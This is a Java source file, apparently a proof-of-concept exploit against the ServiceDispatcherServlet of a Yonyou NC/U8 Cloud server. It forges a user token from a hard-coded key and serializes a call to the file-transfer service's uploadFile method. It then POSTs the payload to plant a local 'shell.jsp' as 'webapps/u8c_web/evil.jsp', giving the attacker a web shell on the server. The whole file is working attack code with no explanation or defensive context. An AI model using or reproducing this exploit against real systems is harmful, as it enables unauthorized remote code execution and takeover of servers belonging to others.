import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.bs.framework.exception.FrameworkRuntimeException;
import nc.bs.framework.server.token.MD5Util;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;


public class ServiceDispatcherServlet {
    public static void main(String[] args) throws Exception {
        byte[] data = createData("./shell.jsp");
//        new FileOutputStream("./data").write(data);

        String userCode = "1";
        String service = "nc.itf.hr.tools.IFileTrans";
        String method = "uploadFile";
        Class[] classes = {byte[].class, String.class};
        Object[] params = {data, "webapps/u8c_web/evil.jsp"};
        InvocationInfo invocationInfo = new InvocationInfo(service, method, classes, params);
        invocationInfo.setUserCode(userCode);
        invocationInfo.setToken(genToken(userCode));
        FileOutputStream fos = new FileOutputStream("./ser1.bin");
        NetObjectOutputStream.writeObject(fos, invocationInfo);
        post();

//        byte[] bytes = Files.readAllBytes(Paths.get("./ser1.bin"));
//        String s = Base64.getEncoder().encodeToString(bytes);
//        System.out.println(s);
//        String s1 = genToken("1");
//        System.out.println(s1);


    }

    public static byte[] createData(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] fileBytes = new byte[(int) file.length()];
        FileInputStream fis = new FileInputStream(file);
        fis.read(fileBytes);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zos = new ZipOutputStream(baos);
        ZipEntry entry = new ZipEntry("compressed");
        zos.putNextEntry(entry);
        zos.write(fileBytes);
        zos.closeEntry();
        zos.close();
        return baos.toByteArray();
    }

    private static byte[] md5(byte[] key, byte[] tokens) {
        MessageDigest md = null;

        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(tokens);
            md.update(key);
            return md.digest();
        } catch (Exception var5) {
            Exception e = var5;
            throw new FrameworkRuntimeException("md5 error", e);
        }
    }

    public static String genToken(String userCode) {
        byte[] md5 = md5("ab7d823e-03ef-39c1-9947-060a0a08b931".getBytes(), userCode.getBytes());
        return MD5Util.byteToHexString(md5);
    }

    public static void post() throws Exception {
        // 目标 URL
        URL url = new URL("http://127.0.0.1:8051/ServiceDispatcherServlet");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        // 配置请求
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/octet-stream");

        // 从 ser1.bin 读取序列化数据

        File file = new File("./ser1.bin");
        byte[] data = new byte[(int) file.length()];
        FileInputStream fis = new FileInputStream(file);
        fis.read(data);

        // 写入请求体
        try (OutputStream os = conn.getOutputStream()) {
            os.write(data);
            os.flush();
        }

        // 读取响应
        try (InputStream is = conn.getInputStream();
             BufferedReader br = new BufferedReader(new InputStreamReader(is))) {
            String line;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
        }

        conn.disconnect();
    }
}
